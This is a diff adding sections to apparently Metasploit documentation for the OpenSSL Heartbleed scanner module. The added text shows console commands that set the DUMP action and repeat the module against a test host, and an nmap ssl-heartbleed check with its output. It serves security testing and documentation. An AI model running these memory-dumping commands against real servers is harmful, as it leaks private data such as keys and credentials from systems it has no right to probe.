@@ -318,3 +318,66 @@ mL�n�*�]`����D�>a���K�@V|����q�'�UHn�'�U
 ```
 
 The contents of `/etc/hosts` is visible in this file, as it was edited to prevent the `gethostbyname failure` issue previously noted.
+
+### Utilizing repeat
+
+Because arbitrary memory is dumped, a high volume application that uses openSSL will cycle potentially valuable data
+fairly often. The `repeat` command can be used to execute the module multiple times.
+
+```
+msf5 > use auxiliary/scanner/ssl/openssl_heartbleed
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set rhosts 222.222.2.222
+rhosts => 222.222.2.222
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set action DUMP
+action => DUMP
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) > repeat -n 10 run
+
+[*] 222.222.2.222:443     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] 222.222.2.222:443     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] 222.222.2.222:443     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] 222.222.2.222:443     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] 222.222.2.222:443     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] 222.222.2.222:443     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] 222.222.2.222:443     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] 222.222.2.222:443     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] 222.222.2.222:443     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] 222.222.2.222:443     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+## Confirming using NMAP
+
+Utilizing the [ssl-heartbleed](https://nmap.org/nsedoc/scripts/ssl-heartbleed.html) script, we can replicate
+the `SCAN` action.
+
+```
+# nmap -p 44330 --script ssl-heartbleed 222.222.2.222
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 17:52 EDT
+Nmap scan report for ubuntu1804.romain (222.222.2.222)
+Host is up (0.0017s latency).
+
+PORT      STATE SERVICE
+44330/tcp open  unknown
+| ssl-heartbleed:
+|   VULNERABLE:
+|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
+|     State: VULNERABLE
+|     Risk factor: High
+|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
+|
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
+|       http://cvedetails.com/cve/2014-0160/
+|_      http://www.openssl.org/news/secadv_20140407.txt
+MAC Address: 00:0C:29:AA:AA:AA (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
+```
